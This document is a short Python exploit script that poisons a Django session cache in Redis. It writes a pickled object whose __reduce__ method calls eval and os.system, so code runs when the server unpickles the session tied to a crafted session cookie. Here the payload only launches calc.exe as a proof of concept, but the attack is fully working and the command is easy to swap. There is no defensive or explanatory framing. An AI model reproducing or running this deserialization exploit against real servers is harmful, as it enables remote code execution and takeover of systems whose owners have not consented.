import redis
import pickle
import base64

# Configuration
REDIS_HOST = '192.168.1.88'
REDIS_PORT = 6379
# This matches the sessionid we will use in the cookie
SESSION_ID = 'pwned_session_1337'
# Django session cache prefix (Default format is ':1:key')
CACHE_KEY = f":1:django.contrib.sessions.cache{SESSION_ID}"

class RCE:
    def __reduce__(self):
        # Using the Universal Pattern to ensure
        # Cross-Platform compatibility (Linux -> Windows)
        return (eval, ("__import__('os').system('calc.exe') or {}",))

def poison_redis():
    print(f"[*] Connecting to Redis at {REDIS_HOST}:{REDIS_PORT}...")
    r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=0)

    # Create the malicious payload
    payload = RCE()
    pickled_payload = pickle.dumps(payload)

    print(f"[*] Poisoning key: {CACHE_KEY}")
    # Django's RedisCache stores the pickle directly
    r.set(CACHE_KEY, pickled_payload)
    print("[+] Cache poisoned successfully!")

if __name__ == "__main__":
    poison_redis()